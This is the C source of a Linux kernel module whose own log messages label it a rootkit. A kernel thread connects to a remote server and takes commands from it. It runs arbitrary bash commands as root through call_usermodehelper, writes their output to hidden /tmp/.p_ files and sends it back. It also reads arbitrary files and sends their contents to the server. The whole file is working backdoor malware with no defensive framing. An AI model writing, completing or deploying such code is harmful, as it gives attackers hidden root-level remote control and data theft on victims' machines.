#include <linux/string.h>
#include <linux/slab.h> // For kmalloc and kfree
#include <linux/random.h>
#include <linux/fs.h>
#include <linux/kthread.h>

#include <linux/delay.h>

#include <linux/sched.h>
#include <linux/sched/task.h>

#include "net/socket.h"
#include "server/options.h"
#include "server/protocol.h"
#include "server/communication.h"


int running = 1;


// Init function
static int main_thread(void *data_) {
    // int ret;
    struct file *file;
    struct inode *inode;
    loff_t file_size;
    char *buffer = kzalloc(BUFFER_SIZE+10, GFP_KERNEL);
    if (!buffer) {
        pr_err("Failed to allocate buffer memory\n");
        return -ENOMEM;
    }
    char *file_buffer = NULL;
    char command;
    uint32_t data_stream_id;
    char output;
    uint64_t data_size;
    char *data = NULL;
    char *output_file = NULL;
    char *cmd_with_redirection = NULL;




    // Connect
    // connect:
    connect_to_server();
    while (running) {
        memset(buffer, 0, BUFFER_SIZE); // clean buffer

        start:
        // --- receive from server RUN_CMD_CLIENT ---
        receive(buffer, BUFFER_SIZE);
        command = buffer[0];

        if (command == COMMAND_EXECCMD || command == COMMAND_EXECBIN || command == COMMAND_EXECASM || command == COMMAND_DEVREAD || 
            command == COMMAND_DEVWRITE || command == COMMAND_DEVSHOW || command == COMMAND_FILEREAD || command == COMMAND_FILEWRITE) {
            
            decapsulate_run_cmd_client(buffer, &data_stream_id, &output, &data_size);

            // --- send to admin TRANSFER_CMD ---
            encapsulate_transfer_cmd(buffer, COMMAND_STARTRECEIVINGFROMCLIENT, data_stream_id);
            send(buffer, BUFFER_SIZE);
            pr_info("[ROOTKIT] Received options: data_stream_id: %i, output: %i, data_size: %i\n", (int)data_stream_id, (int)output, (int)data_size);

            if (data) {
                kfree(data);
                data = NULL;
            }
            data = kzalloc(data_size+BUFFER_SIZE, GFP_KERNEL);
            
            if (receive_data(buffer, data_stream_id, data_size, data) < 0) {
                pr_err("[ROOTKIT] Error, restarting loop\n");
                goto start;
            }
                
            if (command == COMMAND_EXECCMD && output) {
                
                if (output_file) {
                    kfree(output_file);
                    output_file = NULL;
                }
                output_file = kzalloc(19+10, GFP_KERNEL);
                if (!output_file) {
                    pr_err("Failed to allocate buffer memory\n");
                    return -ENOMEM;
                }
                strcpy(output_file, "/tmp/.p_"); // output file path is "/tmp/.p_" + random letters
                for (int i = 7; i < 18; ++i) {
                    output_file[i] = 'a' + get_random_long() % 26; // generates random uppercase letters
                }
                output_file[17] = '\0';

                if (cmd_with_redirection) {
                    kfree(cmd_with_redirection);
                    cmd_with_redirection = NULL;
                }
                cmd_with_redirection = kzalloc(data_size + strlen(output_file) + 3 + 10, GFP_KERNEL);
                if (!cmd_with_redirection) {
                    printk(KERN_ERR "Failed to allocate memory\n");
                    return -ENOMEM;
                }
                // msleep(400);
                sprintf(cmd_with_redirection, "%s>>%s", data, output_file);

                char *argv[] = { "/bin/bash", "-c", cmd_with_redirection, NULL};
                // char *envp[] = { "TERM=xterm-256color", "PATH=/usr/local/bin:/usr/bin:/bin", NULL };

                // #define UMH_NO_WAIT	0x00	/* don't wait at all */
                // #define UMH_WAIT_EXEC	0x01	/* wait for the exec, but not the process */
                // #define UMH_WAIT_PROC	0x02	/* wait for the process to complete */
                // #define UMH_KILLABLE	0x04	/* wait for EXEC/PROC killable */
                // #define UMH_FREEZABLE	0x08	/* wait for EXEC/PROC freezable */
                pr_info("[ROOTKIT] Running command: %s\n", cmd_with_redirection);
                // if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC) < 0) {
                //     pr_err("[ROOTKIT] Error, restarting loop\n");
                //     goto start;
                // }
                if (call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC) < 0) {
                    pr_err("[ROOTKIT] Error, restarting loop\n");
                    goto start;
                }

                // pr_info("ret: %i", ret);
                // msleep(1000);

                do {
                    file = filp_open(output_file, O_RDONLY, 0);
                    if (!file || IS_ERR(file)) {
                        msleep(100);
                    }
                    
                } while (!file || IS_ERR(file));

                pr_info("file opened: %i\n", IS_ERR(file));
                // msleep(2000);
                // get output file size
                inode = file_inode(file);
                file_size = i_size_read(inode);
                filp_close(file, NULL);

                pr_info("[ROOTKIT] Command output size: %lld\n", (long long)file_size);

                if (file_buffer) {
                    kfree(file_buffer);
                    file_buffer = NULL;
                }
                file_buffer = kmalloc(BUFFER_SIZE + 10, GFP_NOFS);
                if (!file_buffer) {
                    pr_err("Failed to allocate buffer memory\n");
                    return -ENOMEM;
                }

                if (send_output_from_file(buffer, file_buffer, file_size, output_file, data_stream_id, data) < 0) {
                    pr_err("[ROOTKIT] Error, restarting loop\n");
                    goto start;
                }


            } else if (command == COMMAND_EXECCMD && !output){
                pr_info("[ROOTKIT] Running command: %s\n", data);
                char *argv[] = { "/bin/bash", "-c", data , NULL};
                call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);

            } else if (command == COMMAND_FILEREAD && output){

                file = filp_open(data, O_RDONLY, 0);
                if (!file || IS_ERR(file)) {
                    file_size = -1;
                } else {
                    inode = file_inode(file);
                    file_size = i_size_read(inode);
                    filp_close(file, NULL);
                }
                
                pr_info("file opened: %i\n", IS_ERR(file));
                // msleep(2000);
                // get output file size


                pr_info("[ROOTKIT] File size: %lld\n", (long long)file_size);

                if (file_buffer) {
                    kfree(file_buffer);
                    file_buffer = NULL;
                }
                file_buffer = kmalloc(BUFFER_SIZE+10, GFP_NOFS);
                if (!file_buffer) {
                    pr_err("Failed to allocate buffer memory\n");
                    return -ENOMEM;
                }

                if (send_output_from_file(buffer, file_buffer, file_size, data, data_stream_id, data) < 0) {
                    pr_err("[ROOTKIT] Error, restarting loop\n");
                    goto start;
                }
            }


            // msleep(100);
        }
    // msleep(500);
    }
    sock_release(conn_socket);
    return 0;
}

static int __init custom_module_init(void)
{
    struct task_struct *task;
    pr_info("Loading my module\n");

    // Create a kernel thread to run our command
    task = kthread_run(main_thread, NULL, "my_kthread");
    if (IS_ERR(task)) {
        pr_err("Failed to create kernel thread\n");
        return PTR_ERR(task);
    }

    return 0;
}

// Function to clean module
static void __exit custom_module_exit(void) {
    pr_info("Cleaning up module\n");
    running = 0;
    if (conn_socket) {
        // Close the socket
        sock_release(conn_socket);
        conn_socket = NULL;
    }
}

module_init(custom_module_init);
module_exit(custom_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("");
